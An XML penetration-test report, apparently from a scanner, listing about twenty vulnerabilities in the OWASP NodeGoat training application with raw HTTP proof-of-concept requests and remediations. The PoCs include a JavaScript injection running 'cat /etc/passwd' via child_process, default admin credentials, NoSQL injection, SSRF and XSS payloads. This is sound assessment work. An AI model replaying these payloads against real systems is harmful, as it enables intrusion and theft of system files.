<?xml version="1.0" encoding="utf-8"?>
<Vulnerabilities>
	<Vulnerability>
		<ID>6507875/467621776</ID>
		<Name>Code Injection in /contributions</Name>
		<Date>2019-05-24 12:27:24</Date>
		<Status>new</Status>
		<Type>Code Injection</Type>
		<CWE-ID>CWE-94</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>9.8 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]</CVSSv3>
		<Risk>CRITICAL</Risk>
		<URL>http://owasp-nodegoat.com:4000/contributions</URL>
		<Description><![CDATA[Server-side JavaScript code injection vulnerability exists due to insufficient filtration of user-supplied data passed via the "preTax" HTTP POST parameter to "http://owasp-nodegoat.com:4000/contributions" URL. A remote authenticated attacker (note, registration is open) can send a specially crafted HTTP POST request and execute arbitrary JavaScript code in the security context of the Node.js server. ]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/contributions HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/contributions
Content-Type: application/x-www-form-urlencoded
Content-Length: 90
Connection: close
Cookie: connect.sid=s%3ATVNY7sIvAefK3mQqKY55ouSIymVtOlNr.ab4Ev%2FCyiDZODrQZOQL1Ejq4AVo4Eii51cYfCCr1L1g
Upgrade-Insecure-Requests: 1

preTax=preTax%3D2%3B+var+asd+%3D+require%28%27child_process%27%29.execSync%28%27cat+%2Fetc%2Fpasswd%27%29%3B+res.write%28asd%29&roth=0&afterTax=0]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/680193300</ID>
		<Name>Default Administrative Credentials</Name>
		<Date>2019-05-24 12:40:10</Date>
		<Status>new</Status>
		<Type>Credentials Management</Type>
		<CWE-ID>CWE-255</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>8.6 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L]</CVSSv3>
		<Risk>HIGH</Risk>
		<URL>http://owasp-nodegoat.com:4000/login</URL>
		<Description><![CDATA[It is possible to login to the web application at "[b]http://owasp-nodegoat.com:4000/login[/b]" with default administrator credentials:

admin:Admin_123

This allows an attacker to access the administrator panel and list all employees, and modify benefit details This can lead to the disruption of business processes.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/login HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 40
Connection: close
Cookie: connect.sid=s%3AiPWDHvwFFxAuLWhX-NzSevJGgkTeNDXY.q0%2BrgCqu7knSrKeXWvYWYjUTM%2Bl5AyOB12VBCqkxy8w
Upgrade-Insecure-Requests: 1

userName=admin&password=Admin_123&_csrf=]]></PoC>
		<Remediation><![CDATA[Implement a sufficiently string password policy for all user accounts. One which enforces complexity rules such as length, and a mix of letters/numbers and special characters.]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/91022321</ID>
		<Name>Improper Access Control to /benefits</Name>
		<Date>2019-05-24 12:40:27</Date>
		<Status>new</Status>
		<Type>Improper Access Control</Type>
		<CWE-ID>CWE-284</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>6.5 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/benefits</URL>
		<Description><![CDATA[The web application does not properly limits access to the "[B]/benefits[/B]" URL, which contains administrative functionality and potentially sensitive information. A remote authenticated attacker (registration is open) can use the vulnerable URL to access administrative functionality and gain potentially sensitive data.

Upon successful exploitation of this vulnerability, an attacker will be able to collect potentially sensitive information or perform further attacks, e.g. elevate privileges in the application using Stored XSS vulnerability (#52577646). 
]]></Description>
		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/benefits HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhyDKdMNZePvrEWfZcP5odE
Upgrade-Insecure-Requests: 1]]></PoC>
		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/515543360</ID>
		<Name>CSRF in /profile</Name>
		<Date>2019-05-24 12:47:44</Date>
		<Status>new</Status>
		<Type>Cross-Site Request Forgery</Type>
		<CWE-ID>CWE-352</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>4.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/profile</URL>
		<Description><![CDATA[A Cross-Site Request Forgery (CSRF) vulnerability exists due to insufficient validation of the HTTP request origin at "[B]/profile[/B]" URL. A remote unauthenticated attacker can create a specially crafted malicious web page with the CSRF exploit, trick a logged-in authorized to visit the page, spoof the HTTP request as if it was coming from the legitimate user, and change user first name, last name and address.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/profile HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/profile
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Connection: close
Cookie: connect.sid=s%3AxXmL6zNLGdvwBD8obMRUPrEg73VNAHXY.QAf7RYmaebIsA1UuU9LgWhyDKdMNZePvrEWfZcP5odE
Upgrade-Insecure-Requests: 1

firstName=&lastName=&ssn=&dob=&bankAcc=&bankRouting=0198212%23+&address=&_csrf=&submit=]]></PoC>
		<Remediation><![CDATA[Implement a proper anti-CSRF protection mechanism, which would generate unique random tokens for every form, keep track of these tokens and perform validation of the HTTP request origin by comparing received token from the user with the token generated on the server side. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/63410603</ID>
		<Name>Weak Password Policy</Name>
		<Date>2019-05-24 12:59:01</Date>
		<Status>new</Status>
		<Type>MAIN_WARNING</Type>
		<CWE-ID>MAIN_WARNING</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>0 [CVSS:3.0/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]</CVSSv3>
		<Risk>WARNING</Risk>
		<URL>http://owasp-nodegoat.com:4000</URL>
		<Description><![CDATA[The web application's current password policy allows weak passwords that could be trivially guessed by attackers, an example is a testing account created during the assessment of "password".
We recommend changing your password policy and reject weak and predictable passwords. Passwords are considered strong, when they are at least 8-10 characters long, contain lower and upper case letters, numbers and special symbols.]]></Description>
		<PoC><![CDATA[]]></PoC>
		<Remediation><![CDATA[]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/139824208</ID>
		<Name>Missing Brute-force Protection</Name>
		<Date>2019-05-24 12:59:02</Date>
		<Status>new</Status>
		<Type>MAIN_WARNING</Type>
		<CWE-ID>MAIN_WARNING</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>0 [CVSS:3.0/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]</CVSSv3>
		<Risk>WARNING</Risk>
		<URL>http://owasp-nodegoat.com:4000/login</URL>
		<Description><![CDATA[Your application does not seem to have protection against brute-force attacks and allows unlimited number of attempts to guess username and password. A remote attacker can abuse the lack of such security measure and gain unauthorized access to your web application. ]]></Description>
		<PoC><![CDATA[http://owasp-nodegoat.com:4000/login]]></PoC>
		<Remediation><![CDATA[It is recommended to add additional level of protection against brute-force attacks and require CAPTCHA code after a certain number of unsuccessful login attempts (recommended values are from 3 to 5 unsuccessful attempts) or lock the account for a certain amount of time (recommended value is 30 minutes).]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/935934674</ID>
		<Name>Improper Access Control at http://owasp-nodegoat.com:4000/allocations/</Name>
		<Date>2019-05-24 13:07:10</Date>
		<Status>new</Status>
		<Type>Improper Access Control</Type>
		<CWE-ID>CWE-284</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>5.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/allocations/</URL>
		<Description><![CDATA[The web application allows uses a numeric identifier to reference objects related to asset information at the "[B]http://owasp-nodegoat.com:4000/allocations/#ID#[/B]" URL, where #ID# stands for a subsequent number. A remote authenticated user (registration is open) can modify the identifier in URL and get unauthorized access to sensitive data of other web application users.]]></Description>
		<PoC><![CDATA[http://owasp-nodegoat.com:4000/allocations/1]]></PoC>
		<Remediation><![CDATA[Implement a proper User Access Control mechanism in your web application in order to verify the user's identity and access permissions before allowing access to any sensitive data. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/306675156</ID>
		<Name>Usernames Enumeration</Name>
		<Date>2019-05-24 13:17:46</Date>
		<Status>new</Status>
		<Type>MAIN_WARNING</Type>
		<CWE-ID>MAIN_WARNING</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>0 [CVSS:3.0/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]</CVSSv3>
		<Risk>WARNING</Risk>
		<URL>http://owasp-nodegoat.com:4000/login</URL>
		<Description><![CDATA[A user account enumeration issue exists due a verbose error message when attempting to login via "[b]/login[/b]" URL. Upon entering a non-existing value, the application will respond with an error message saying "Invalid username", while upon supplying an existing user account, the application will respond with "Invalid password" message. A remote unauthenticated attacker can use brute-force attack to enumerate existing user accounts, as there is no captcha present on the password reset page.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/login HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Connection: close
Cookie: connect.sid=s%3A-kBD9z7vKV0FP_FBedM2ib4Kno4SjbE_.NbBoiFTdgA3uiUoMIfdaoP%2FKh5Y9P3RJdK4cTI%2Ftu4s
Upgrade-Insecure-Requests: 1

userName=nosuchusername&password=123&_csrf=]]></PoC>
		<Remediation><![CDATA[Ensure that the same message is returned by the application with both existing and non-existing user accounts. In addition, implement a captcha mechanism on the password reset page to limit the number of reset attempts that can come from a given IP address.]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/272962725</ID>
		<Name>Open Redirect in /learn</Name>
		<Date>2019-05-24 13:35:04</Date>
		<Status>new</Status>
		<Type>Open Redirect</Type>
		<CWE-ID>CWE-601</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>3.4 [CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N]</CVSSv3>
		<Risk>LOW</Risk>
		<URL>http://owasp-nodegoat.com:4000/learn</URL>
		<Description><![CDATA[An Open Redirection vulnerability exists due to insufficient validation of the "[B]url[/B]" HTTP GET parameter in "[B]/learn[/B]" script prior to redirection.]]></Description>
		<PoC><![CDATA[http://owasp-nodegoat.com:4000/learn?url=https://immuniweb.com]]></PoC>
		<Remediation><![CDATA[To eliminate the vulnerability we propose editing the source code of your web application and change the behavior of your redirection script. Do not to rely on the "url" HTTP GET parameter when redirecting users to internal or external web pages. We suggest implementing additional checks for the redirection URL or use so-called proxy pages when redirecting users to external websites in order to warn them that they are leaving your website.]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/420376655</ID>
		<Name>Usage of Unencrypted HTTP Protocol</Name>
		<Date>2019-05-24 13:58:38</Date>
		<Status>new</Status>
		<Type>Cleartext Transmission of Sensitive Information</Type>
		<CWE-ID>CWE-319</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>5.4 [CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/</URL>
		<Description><![CDATA[The web application uses the unencrypted HTTP protocol to transmit sensitive information, such as user credentials via the login form. An attacker with ability to perform a man-in-the-middle attack can intercept credentials and compromise user accounts. ]]></Description>
		<PoC><![CDATA[http://owasp-nodegoat.com:4000/]]></PoC>
		<Remediation><![CDATA[Enforce the use of HTTPS site-wide along with a valid certificate signed by a trusted certificate authority.]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/740880507</ID>
		<Name>NoSQL Injection in /allocations</Name>
		<Date>2019-05-24 15:14:28</Date>
		<Status>new</Status>
		<Type>Improper Neutralization of Special Elements in Data Query Logic</Type>
		<CWE-ID>CWE-943</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>9.8 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]</CVSSv3>
		<Risk>CRITICAL</Risk>
		<URL>http://owasp-nodegoat.com:4000/allocations/67</URL>
		<Description><![CDATA[A NoSQL injection vulnerability exists in the "[B]/allocations/67[/B]" URL when handling user-supplied input passed without sanitization via the "[B]threshold[/B]" HTTP GET parameter.]]></Description>
		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/allocations/67?threshold=5%27;return%20(true);var%20foo=%27bar HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: connect.sid=s%3Ay1QXigxD4S83biS13G4NcUBE_Mw95xu2.2%2BX3%2F0Tr046AmODS2aLuJdv8jLSCVtVrTSPAO3pMkBs
Upgrade-Insecure-Requests: 1]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. ]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/779120866</ID>
		<Name>Server-Side Request Forgery (SSRF) in http://owasp-nodegoat.com:4000/research</Name>
		<Date>2019-05-24 15:27:11</Date>
		<Status>new</Status>
		<Type>Server-Side Request Forgery</Type>
		<CWE-ID>CWE-918</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>8.3 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L]</CVSSv3>
		<Risk>HIGH</Risk>
		<URL>http://owasp-nodegoat.com:4000/research</URL>
		<Description><![CDATA[A Server-Side-Request Forgery vulnerability exists due to the application accepts arbitrary URL passed via the "url" HTTP GET parameter to "http://owasp-nodegoat.com:4000/research" and uses it to perform queries. A remote authenticated attacker (registration is open) can abuse this functionality to send requests to arbitrary servers, including servers, located in local network. 
]]></Description>
		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/research?url=https%3A%2F%2Fwww.immuniweb.com%2F&symbol=a HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: connect.sid=s%3A3ftM3fmLFECSytgej2TaL_r8byx_H8wh.ooNhgVIrmo6wASJkqZDCf7YD%2F7Ed1KzUtRw9OhZVys8
Upgrade-Insecure-Requests: 1]]></PoC>
		<Remediation><![CDATA[Whitelist the URLs that the application is allowed to connect to and disable any other requests. ]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/717691804</ID>
		<Name>Insecure Session Management</Name>
		<Date>2019-05-24 16:41:40</Date>
		<Status>new</Status>
		<Type>MAIN_WARNING</Type>
		<CWE-ID>MAIN_WARNING</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>0 [CVSS:3.0/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]</CVSSv3>
		<Risk>WARNING</Risk>
		<URL>http://owasp-nodegoat.com:4000</URL>
		<Description><![CDATA[The web application does not issue a new session identifier after the user has logged back in from an old session. This allows an attacker to hijack the session of a victim if they are able to steal their cookie. This can lead to account compromise. ]]></Description>
		<PoC><![CDATA[]]></PoC>
		<Remediation><![CDATA[Ensure that a new session identifier is issued to every new session, with the previous sessions identifier being invalidated.]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/324861459</ID>
		<Name>Reflected XSS in /signup</Name>
		<Date>2019-05-28 10:00:43</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>7.2 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>HIGH</Risk>
		<URL>http://owasp-nodegoat.com:4000/signup</URL>
		<Description><![CDATA[Reflected Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]http://owasp-nodegoat.com:4000/signup[/B]" URL passed via the "[B]email[/B]" and "[b]username[/b]" HTTP POST parameters.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/signup HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Encoding: deflate, gzip
Referer: http://owasp-nodegoat.com:4000/signup
Cookie: connect.sid=s%3AJNOTfSmHp-UAIbkg_md4DN4wB39FY0xW.Z9EbGMSy6Q3jx2FIwkNXx4gohw83U%2BR%2BlhanzlhydAQ
Accept-Language: en-us;q=0.8
Content-Length: 131
Content-Type: application/x-www-form-urlencoded

_csrf=&email=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&firstName=1&lastName=1&password=&userName=[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]&verify=]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/892074109</ID>
		<Name>Reflected XSS in /tutorial/</Name>
		<Date>2019-05-28 10:05:31</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/tutorial/[PAYLOAD]%3CiMg%20src%3Dx%20onerror%3Dalert%28%27ImmuniWeb%27%29%3E%20%20[/PAYLOAD]</URL>
		<Description><![CDATA[Reflected Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]http://owasp-nodegoat.com:4000/tutorial/[PAYLOAD]%3CiMg%20src%3Dx%20onerror%3Dalert%28%27ImmuniWeb%27%29%3E%20%20[/PAYLOAD][/B]" URL passed via the HTTP GET.]]></Description>
		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/tutorial/[PAYLOAD]%3CiMg%20src%3Dx%20onerror%3Dalert%28%27ImmuniWeb%27%29%3E%20%20[/PAYLOAD] HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Encoding: deflate, gzip
Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8
Accept-Language: en-us;q=0.8]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/52577646</ID>
		<Name>Stored XSS in /benefits</Name>
		<Date>2019-05-28 10:06:20</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>7.2 [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>HIGH</Risk>
		<URL>http://owasp-nodegoat.com:4000/benefits</URL>
		<Description><![CDATA[Stored Cross-Site Scripting vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/benefits[/B]" URL passed via the "[B]benefitStartDate[/B]" POST parameter. A remote authenticated attacker (registration is open) can inject arbitrary HTML and script code and execute it against web application administrator.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/benefits HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/benefits
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Connection: close
Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8
Upgrade-Insecure-Requests: 1

userId=3&benefitStartDate=[PAYLOAD]"><script>alert("ImmuniWeb");</script>[/PAYLOAD]]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/512427965</ID>
		<Name>Web Forms Collecting Attributable Personal Data</Name>
		<Date>2019-05-28 10:11:25</Date>
		<Status>new</Status>
		<Type>MAIN_WARNING</Type>
		<CWE-ID>MAIN_WARNING</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>0 [CVSS:3.0/AV:X/AC:X/PR:X/UI:X/S:X/C:X/I:X/A:X]</CVSSv3>
		<Risk>WARNING</Risk>
		<URL>http://owasp-nodegoat.com:4000</URL>
		<Description><![CDATA[The following web forms may collect attributable personal data. Make sure that your data acquisition, processing, storage and deletion are compliant with <a href="https://www.eugdpr.org/">EU GDPR</a> and other applicable privacy laws and regulations.

A list of URLs with the web forms are shown below:

http://owasp-nodegoat.com:4000/signup]]></Description>
		<PoC><![CDATA[]]></PoC>
		<Remediation><![CDATA[]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/867489322</ID>
		<Name>Reflected XSS in /allocations/1</Name>
		<Date>2019-05-28 10:15:45</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/allocations/1</URL>
		<Description><![CDATA[A XSS vulnerability exists due to the insufficient filtration and further processing of user-supplied data appended after the "[B]/allocations/1[/B]" URL.]]></Description>
		<PoC><![CDATA[GET http://owasp-nodegoat.com:4000/allocations/1[PAYLOAD]%22%3E%3Cimg%20src=x%20onerror=alert%60ImmuniWeb%60%3E[/PAYLOAD] HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: connect.sid=s%3A15c3tN0RRwoeDqgls4F9qTYeXsE6kZ4W.SkF3DlF49mIMoxKlDf01CMn2ifT4u19iw8z4Y%2Fs3jA8
Upgrade-Insecure-Requests: 1]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/608716921</ID>
		<Name>Reflected XSS in /login</Name>
		<Date>2019-05-28 10:17:52</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/login</URL>
		<Description><![CDATA[Reflected Cross-Site Scripting (XSS) vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/login[/B]" URL passed via the "[B]userName[/B]" HTTP POST parameter.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/login HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: */*
Accept-Encoding: deflate, gzip
Cookie: connect.sid=s%3Aot8tqG6LX3jOHlfb1Fh_Y9KB_HE6vzHs.1bUUNROIgDkK1gAZTfzFtJ7an6HVmjOftxHJwqM%2Fx8Q
Accept-Language: en-us;q=0.8
Content-Length: 103
Content-Type: application/x-www-form-urlencoded

_csrf=&password=admin1&userName=admin[PAYLOAD]%27%22%3E%3CsCript%3Ealert%28%27ImmuniWeb%27%29%3C/sCript%3E%20%20[/PAYLOAD]]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
	<Vulnerability>
		<ID>6507875/428380859</ID>
		<Name>Reflected XSS in /profile</Name>
		<Date>2019-05-28 22:16:01</Date>
		<Status>new</Status>
		<Type>Cross-Site Scripting</Type>
		<CWE-ID>CWE-79</CWE-ID>
		<CVE-ID></CVE-ID>
		<CVSSv3>6.1 [CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N]</CVSSv3>
		<Risk>MEDIUM</Risk>
		<URL>http://owasp-nodegoat.com:4000/profile</URL>
		<Description><![CDATA[Reflected XSS vulnerability exists due to the insufficient filtration and further processing of user-supplied data in the "[B]/profile[/B]" URL passed via the "[B]lastName[/b]" and "[b]ssn[/B]" HTTP POST parameters.]]></Description>
		<PoC><![CDATA[POST http://owasp-nodegoat.com:4000/profile HTTP/1.1
Host: owasp-nodegoat.com:4000
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en,en-US;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://owasp-nodegoat.com:4000/profile
Content-Type: application/x-www-form-urlencoded
Content-Length: 198
Connection: close
Cookie: connect.sid=s%3ADgQ1ifBCLLm5ZR1lQOG6ToRsMQYQX2Hj.6JxsRXgGs0b93zquY%2FWzdDTlxIRt%2Fgs1AEZXKU%2FsT2A
Upgrade-Insecure-Requests: 1

firstName=&lastName=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&ssn=[PAYLOAD]%22%3E%3Cscript%3Ealert%60ImmuniWeb%60%3B%3C%2Fscript%3E[/PAYLOAD]&dob=&bankAcc=&bankRouting=0198212%23&address=&_csrf=&submit=]]></PoC>
		<Remediation><![CDATA[Develop, test and deploy corrections for the application’s source code to properly filter all user-supplied input processed by the application. 
]]></Remediation>
	</Vulnerability>
</Vulnerabilities>